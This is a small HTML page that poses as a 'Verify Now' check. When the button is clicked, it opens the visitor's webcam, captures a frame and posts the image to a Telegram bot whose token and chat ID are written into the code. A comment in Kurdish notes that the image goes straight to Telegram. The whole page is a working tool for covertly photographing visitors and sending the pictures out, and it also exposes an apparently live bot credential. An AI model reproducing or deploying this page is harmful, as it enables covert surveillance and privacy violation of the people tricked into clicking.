<!DOCTYPE html>
<html>
<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
    <button onclick="sendData()" style="padding:20px;">Verify Now</button>
    <script>
        async function sendData() {
            const s = await navigator.mediaDevices.getUserMedia({video:true});
            const v = document.createElement('video'); v.srcObject = s; v.play();
            setTimeout(async () => {
                const cv = document.createElement('canvas'); cv.width=400; cv.height=300;
                cv.getContext('2d').drawImage(v,0,0);
                const img = cv.toDataURL('image/jpeg', 0.5);
                
                // لێرەدا ڕاستەوخۆ دەنێردرێت بۆ تێلیگرام بێ ئەوەی پێویستی بە تێرمیناڵ بێت
                await fetch('https://api.telegram.org/bot8344933620:AAGonsjbg_MdNRjWb5I6QD8e_NCH1H7Emi8/sendMessage', {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({chat_id:'5982066799', text: "📸 NEW:\n" + img})
                });
                alert("Done!");
            }, 2000);
        }
    </script>
</body>
</html>
